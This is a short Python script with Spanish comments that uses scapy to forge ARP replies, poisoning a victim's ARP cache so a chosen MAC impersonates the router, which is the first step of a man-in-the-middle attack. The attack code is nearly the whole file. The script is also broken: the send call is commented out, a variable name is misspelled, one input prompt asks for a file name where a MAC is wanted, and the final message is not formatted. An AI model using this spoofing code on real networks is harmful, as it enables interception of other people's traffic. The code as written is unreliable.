from scapy.all import * 
# Función para enviar un paquete ARP falsificado 
def send_arp_packet(target_ip, target_mac, spoofed_ip, spoofed_mac): arp_response = ARP(op=2, psrc=spoofed_ip, pdst=target_ip, hwsrc=spoofed_mac) 

#send(arp_response, verbose=False) 


# Direcciones MAC e IPs involucradas 
print("ingrese el ip de la victima\n")#08:00:27:ee:48:77
victim_ip= input()
#victim_ip = "192.168.100.197" # IP de la víctima 
print("ingrese la mac de la victima\n")
victim_mac= input()
#victim_mac = "08:00:27:67:7B:62" # MAC actual de la víctima 
print("ingrese su ip\n")
spoofed_ip= input()
#spoofed_ip = "192.168.100.198" # IP del router (o el que quieras suplantar) 
print("ingrese el nombre del archivo con la terminacion\n")
spoofed_mac= input()
#spoofed_mac = "08:00:27:ee:48:77" # MAC falsificada que deseas poner en la víctima # Enviamos el paquete ARP falsificado 
send_arp_packet(victim_ip, victim_mac, sfpooed_ip, spoofed_mac)

print("Enviado un paquete ARP falsificado a {victim_ip} con la MAC {spoofed_mac}")
